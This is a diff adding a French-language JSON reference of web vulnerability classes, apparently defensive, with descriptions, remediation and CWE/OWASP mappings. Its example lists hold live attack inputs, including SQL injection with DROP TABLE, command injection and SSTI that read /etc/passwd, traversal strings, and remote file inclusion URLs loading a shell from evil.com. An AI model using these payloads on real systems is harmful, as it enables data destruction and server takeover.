@@ -1,0 +1,349 @@
+{
+    "sql_injection": {
+        "name": "Injection SQL",
+        "description": "L'injection SQL permet d'exécuter des requêtes SQL malveillantes dans la base de données de l'application. Cette vulnérabilité peut permettre de lire, modifier ou supprimer des données sensibles, voire d'exécuter des commandes sur le serveur.",
+        "severity": "CRITICAL",
+        "examples": [
+            "' OR '1'='1",
+            "1' UNION SELECT NULL--",
+            "1' AND SLEEP(5)--",
+            "1' AND 1=1--",
+            "1'; DROP TABLE users--"
+        ],
+        "remediation": "Utiliser des requêtes paramétrées, échapper les entrées utilisateur, utiliser un ORM, limiter les privilèges de la base de données.",
+        "cwe": "CWE-89",
+        "owasp": "A03:2021 - Injection"
+    },
+    "nosql_injection": {
+        "name": "Injection NoSQL",
+        "description": "L'injection NoSQL cible les bases de données NoSQL comme MongoDB, CouchDB ou Cassandra. Elle peut permettre de contourner l'authentification, d'extraire des données ou d'exécuter des opérations non autorisées.",
+        "severity": "HIGH",
+        "examples": [
+            "{'$ne': ''}",
+            "{'$gt': ''}",
+            "admin' && '1'=='1",
+            "{'$or': []}",
+            "{'$where': '1==1'}"
+        ],
+        "remediation": "Valider et nettoyer les entrées utilisateur, utiliser des schémas de validation, éviter les opérateurs dangereux ($where, $regex).",
+        "cwe": "CWE-943",
+        "owasp": "A03:2021 - Injection"
+    },
+    "command_injection": {
+        "name": "Injection de Commandes",
+        "description": "L'injection de commandes permet d'exécuter des commandes système arbitraires sur le serveur, pouvant conduire à une prise de contrôle complète du système.",
+        "severity": "CRITICAL",
+        "examples": [
+            "; ls",
+            "| cat /etc/passwd",
+            "& whoami",
+            "$(id)",
+            "`id`",
+            "|| dir"
+        ],
+        "remediation": "Éviter d'appeler des commandes système, utiliser des API sécurisées, valider et échapper les entrées, utiliser des listes blanches.",
+        "cwe": "CWE-78",
+        "owasp": "A03:2021 - Injection"
+    },
+    "ldap_injection": {
+        "name": "Injection LDAP",
+        "description": "L'injection LDAP permet de manipuler les requêtes LDAP pour contourner l'authentification ou extraire des informations sensibles de l'annuaire d'entreprise.",
+        "severity": "HIGH",
+        "examples": [
+            "*)(uid=*",
+            "admin*",
+            "*)(|(password=*)",
+            "admin)(&(cn=*)(sn=*",
+            "admin)(!(cn=admin"
+        ],
+        "remediation": "Échapper les caractères spéciaux LDAP (*, (, ), \\, NUL), utiliser des requêtes paramétrées, valider les entrées.",
+        "cwe": "CWE-90",
+        "owasp": "A03:2021 - Injection"
+    },
+    "xpath_injection": {
+        "name": "Injection XPath",
+        "description": "L'injection XPath permet de manipuler les requêtes XPath pour accéder à des données XML normalement protégées ou contourner l'authentification.",
+        "severity": "HIGH",
+        "examples": [
+            "' or '1'='1",
+            "'] | //* | //*['",
+            "admin' or '1'='1",
+            "' or count(//user)=1",
+            "' or //user[1]/@username='admin"
+        ],
+        "remediation": "Valider et échapper les entrées, éviter les requêtes XPath dynamiques, utiliser des expressions paramétrées.",
+        "cwe": "CWE-643",
+        "owasp": "A03:2021 - Injection"
+    },
+    "html_injection": {
+        "name": "Injection HTML",
+        "description": "L'injection HTML permet d'insérer du code HTML arbitraire dans la page, pouvant être utilisé pour du phishing, du défaussement ou du vol de données.",
+        "severity": "MEDIUM",
+        "examples": [
+            "<h1>INJECTED</h1>",
+            "<img src=x onerror=alert('XSS')>",
+            "<div style='position:fixed'>HACKED</div>",
+            "<body style='background:black'><h1>HACKED</h1>"
+        ],
+        "remediation": "Échapper le HTML, utiliser des politiques de sécurité de contenu (CSP), encoder les sorties.",
+        "cwe": "CWE-79",
+        "owasp": "A03:2021 - Injection"
+    },
+    "template_injection": {
+        "name": "Injection de Templates (SSTI)",
+        "description": "L'injection de templates (Server-Side Template Injection) permet d'exécuter du code arbitraire dans le moteur de templates, pouvant mener à une exécution de code à distance (RCE).",
+        "severity": "CRITICAL",
+        "examples": [
+            "{{7*7}}",
+            "${7*7}",
+            "{{config}}",
+            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
+        ],
+        "remediation": "Ne pas exposer l'utilisateur aux templates, utiliser des sandboxes, valider les entrées, limiter les fonctionnalités du moteur.",
+        "cwe": "CWE-94",
+        "owasp": "A03:2021 - Injection"
+    },
+    "xss": {
+        "name": "Cross-Site Scripting (XSS)",
+        "description": "Le XSS permet d'injecter des scripts malveillants dans les pages web visualisées par d'autres utilisateurs, pouvant voler des cookies, des sessions ou des données sensibles.",
+        "severity": "HIGH",
+        "types": {
+            "reflected": "Le payload est réfléchi immédiatement dans la réponse",
+            "stored": "Le payload est stocké sur le serveur et exécuté à chaque visite",
+            "dom": "Le payload modifie le DOM côté client sans passer par le serveur"
+        },
+        "examples": [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg onload=alert('XSS')>",
+            "javascript:alert('XSS')"
+        ],
+        "remediation": "Échapper les sorties HTML, utiliser CSP (Content Security Policy), valider les entrées, utiliser HttpOnly sur les cookies.",
+        "cwe": "CWE-79",
+        "owasp": "A03:2021 - Injection"
+    },
+    "csrf": {
+        "name": "Cross-Site Request Forgery (CSRF)",
+        "description": "Le CSRF force un utilisateur authentifié à exécuter des actions non désirées sur une application web, comme changer son mot de passe ou effectuer un transfert bancaire.",
+        "severity": "HIGH",
+        "examples": [
+            "Formulaire caché auto-soumis",
+            "Image malveillante",
+            "Requête AJAX cross-origin",
+            "Lien malveillant"
+        ],
+        "remediation": "Utiliser des tokens CSRF, vérifier l'en-tête Referer/Origin, utiliser les cookies SameSite, demander une confirmation pour les actions sensibles.",
+        "cwe": "CWE-352",
+        "owasp": "A04:2021 - Insecure Design"
+    },
+    "clickjacking": {
+        "name": "Clickjacking",
+        "description": "Le clickjacking trompe l'utilisateur en lui faisant cliquer sur des éléments invisibles d'une page web, détournant ses actions vers des intentions malveillantes.",
+        "severity": "MEDIUM",
+        "examples": [
+            "Iframe transparent superposé",
+            "Superposition de boutons",
+            "Cursor hijacking",
+            "Drag-and-drop forcé"
+        ],
+        "remediation": "Ajouter l'en-tête X-Frame-Options: DENY ou SAMEORIGIN, utiliser CSP frame-ancestors, implémenter des scripts de frame busting.",
+        "cwe": "CWE-1021",
+        "owasp": "A04:2021 - Insecure Design"
+    },
+    "cors": {
+        "name": "Mauvaise configuration CORS",
+        "description": "Une mauvaise configuration CORS peut permettre à des sites malveillants d'accéder à des données sensibles via des requêtes cross-origin non autorisées.",
+        "severity": "HIGH",
+        "examples": [
+            "Access-Control-Allow-Origin: *",
+            "Reflected Origin",
+            "Correspondance partielle d'origine",
+            "Credentials autorisés avec wildcard"
+        ],
+        "remediation": "Ne pas utiliser * pour ACAO, valider strictement les origines, ne pas autoriser les credentials avec *, utiliser une liste blanche d'origines.",
+        "cwe": "CWE-942",
+        "owasp": "A04:2021 - Insecure Design"
+    },
+    "lfi": {
+        "name": "Local File Inclusion (LFI)",
+        "description": "Le LFI permet d'inclure des fichiers locaux du serveur, pouvant exposer des données sensibles comme /etc/passwd, les fichiers de configuration ou le code source.",
+        "severity": "HIGH",
+        "examples": [
+            "../../../etc/passwd",
+            "....//....//etc/passwd",
+            "..;/..;/etc/passwd",
+            "php://filter/convert.base64-encode/resource=index.php"
+        ],
+        "remediation": "Valider les chemins, utiliser des listes blanches de fichiers, limiter l'accès aux fichiers sensibles, configurer open_basedir.",
+        "cwe": "CWE-98",
+        "owasp": "A05:2021 - Security Misconfiguration"
+    },
+    "rfi": {
+        "name": "Remote File Inclusion (RFI)",
+        "description": "Le RFI permet d'inclure des fichiers distants, pouvant mener à une exécution de code arbitraire sur le serveur via l'inclusion de scripts malveillants.",
+        "severity": "CRITICAL",
+        "examples": [
+            "http://evil.com/shell.txt",
+            "//evil.com/shell.php",
+            "ftp://evil.com/shell.php",
+            "http://evil.com/shell.php?cmd=id"
+        ],
+        "remediation": "Désactiver allow_url_include et allow_url_fopen, valider les entrées, utiliser des listes blanches, configurer open_basedir.",
+        "cwe": "CWE-98",
+        "owasp": "A05:2021 - Security Misconfiguration"
+    },
+    "file_upload": {
+        "name": "Upload de Fichiers Malveillants",
+        "description": "L'upload non sécurisé permet de téléverser des fichiers exécutables sur le serveur, pouvant mener à une exécution de code, un defacement ou une prise de contrôle.",
+        "severity": "CRITICAL",
+        "examples": [
+            "shell.php",
+            "shell.asp",
+            "shell.jsp",
+            "shell.aspx",
+            "shell.phtml"
+        ],
+        "remediation": "Valider le type MIME, vérifier l'extension, renommer les fichiers, scanner antivirus, stocker hors du webroot, limiter la taille.",
+        "cwe": "CWE-434",
+        "owasp": "A05:2021 - Security Misconfiguration"
+    },
+    "directory_traversal": {
+        "name": "Directory Traversal",
+        "description": "Le directory traversal permet d'accéder à des fichiers en dehors du répertoire racine, exposant des fichiers système ou de configuration sensibles.",
+        "severity": "HIGH",
+        "examples": [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\win.ini",
+            "....//....//etc/passwd",
+            "..%2f..%2f..%2fetc%2fpasswd"
+        ],
+        "remediation": "Normaliser les chemins, utiliser des listes blanches, limiter l'accès aux fichiers, configurer le serveur correctement.",
+        "cwe": "CWE-22",
+        "owasp": "A05:2021 - Security Misconfiguration"
+    },
+    "bruteforce": {
+        "name": "Force Brute",
+        "description": "La force brute tente de trouver des identifiants valides en essayant de nombreuses combinaisons d'utilisateurs et de mots de passe.",
+        "severity": "MEDIUM",
+        "examples": [
+            "Dictionnaire d'utilisateurs",
+            "Dictionnaire de mots de passe",
+            "Attaque par mot de passe commun",
+            "Attaque par suffixe numérique"
+        ],
+        "remediation": "Limiter les tentatives, utiliser CAPTCHA, verrouillage de compte progressif, authentification multi-facteurs (2FA/MFA).",
+        "cwe": "CWE-307",
+        "owasp": "A07:2021 - Identification and Authentication Failures"
+    },
+    "credential_stuffing": {
+        "name": "Credential Stuffing",
+        "description": "Le credential stuffing utilise des identifiants volés lors de fuites de données pour tenter de se connecter à d'autres services.",
+        "severity": "HIGH",
+        "examples": [
+            "Listes de fuites de données (RockYou, Collection #1)",
+            "Utilisation de mots de passe réutilisés",
+            "Test de combinaisons username:password"
+        ],
+        "remediation": "Imposer des mots de passe uniques, utiliser 2FA/MFA, surveiller les connexions suspectes, utiliser un détecteur de fuites.",
+        "cwe": "CWE-307",
+        "owasp": "A07:2021 - Identification and Authentication Failures"
+    },
+    "password_spraying": {
+        "name": "Password Spraying",
+        "description": "Le password spraying teste un petit nombre de mots de passe courants sur un grand nombre de comptes pour éviter le verrouillage.",
+        "severity": "MEDIUM",
+        "examples": [
+            "Password123",
+            "Welcome1",
+            "Pass@2024",
+            "Admin123"
+        ],
+        "remediation": "Politique de mots de passe forts, 2FA/MFA, détection d'anomalies, alertes sur multiples échecs.",
+        "cwe": "CWE-307",
+        "owasp": "A07:2021 - Identification and Authentication Failures"
+    },
+    "session_hijacking": {
+        "name": "Détournement de Session",
+        "description": "Le détournement de session permet de prendre le contrôle de la session d'un utilisateur en volant son identifiant de session.",
+        "severity": "CRITICAL",
+        "examples": [
+            "Vol de cookie via XSS",
+            "Fixation de session",
+            "Sidejacking (HTTP sniffing)",
+            "Session replay"
+        ],
+        "remediation": "Utiliser HTTPS, attributs HttpOnly et Secure, régénérer les IDs de session après login, utiliser des tokens courts.",
+        "cwe": "CWE-384",
+        "owasp": "A07:2021 - Identification and Authentication Failures"
+    },
+    "session_fixation": {
+        "name": "Fixation de Session",
+        "description": "La fixation de session force un utilisateur à utiliser un ID de session connu de l'attaquant, permettant ensuite de prendre le contrôle.",
+        "severity": "HIGH",
+        "examples": [
+            "URL avec JSESSIONID=fixe",
+            "Cookie fixé via XSS",
+            "Formulaire avec session fixée",
+            "Header avec session fixée"
+        ],
+        "remediation": "Régénérer l'ID de session après authentification, ne pas accepter les IDs fournis, lier la session à l'IP/User-Agent.",
+        "cwe": "CWE-384",
+        "owasp": "A07:2021 - Identification and Authentication Failures"
+    },
+    "jwt": {
+        "name": "Attaques JWT",
+        "description": "Les attaques JWT exploitent les faiblesses des tokens JSON Web Token pour forger des tokens, contourner l'authentification ou élever les privilèges.",
+        "severity": "HIGH",
+        "examples": [
+            "Alg: none (token non signé)",
+            "Brute force du secret HMAC",
+            "Injection dans le paramètre kid",
+            "JKU (JWKS) non sécurisé"
+        ],
+        "remediation": "Utiliser des algorithmes asymétriques (RS256, ES256), valider la signature, ne pas exposer les secrets, utiliser des clés fortes.",
+        "cwe": "CWE-345",
+        "owasp": "A07:2021 - Identification and Authentication Failures"
+    },
+    "api": {
+        "name": "Attaques API",
+        "description": "Les attaques API ciblent les endpoints REST, GraphQL, SOAP pour accéder à des données non autorisées ou exécuter des actions malveillantes.",
+        "severity": "HIGH",
+        "examples": [
+            "IDOR (Insecure Direct Object Reference)",
+            "Mass assignment",
+            "Rate limiting bypass",
+            "Injection dans les paramètres"
+        ],
+        "remediation": "Authentification forte, validation des entrées, rate limiting, logging, chiffrement, validation des schémas.",
+        "cwe": "CWE-639",
+        "owasp": "A01:2021 - Broken Access Control"
+    },
+    "graphql": {
+        "name": "Attaques GraphQL",
+        "description": "Les attaques GraphQL exploitent les spécificités de GraphQL pour extraire des données, effectuer des attaques par déni de service ou contourner les contrôles.",
+        "severity": "HIGH",
+        "examples": [
+            "Introspection pour découvrir le schéma",
+            "Depth attack (requêtes imbriquées)",
+            "Alias attack (champs dupliqués)",
+            "Batch query attack"
+        ],
+        "remediation": "Désactiver l'introspection en production, limiter la profondeur des requêtes, rate limiting, validation des coûts, authentification.",
+        "cwe": "CWE-200",
+        "owasp": "A01:2021 - Broken Access Control"
+    },
+    "websocket": {
+        "name": "Attaques WebSocket",
+        "description": "Les attaques WebSocket ciblent les communications en temps réel pour intercepter, modifier ou injecter des messages.",
+        "severity": "MEDIUM",
+        "examples": [
+            "Cross-origin WebSocket hijacking",
+            "Injection dans les messages",
+            "Denial of service (message flooding)",
+            "Man-in-the-middle"
+        ],
+        "remediation": "Valider l'origine des connexions, authentifier les clients, valider et échapper les messages, utiliser WSS (WebSocket Secure).",
+        "cwe": "CWE-1385",
+        "owasp": "A08:2021 - Software and Data Integrity Failures"
+    }
+}
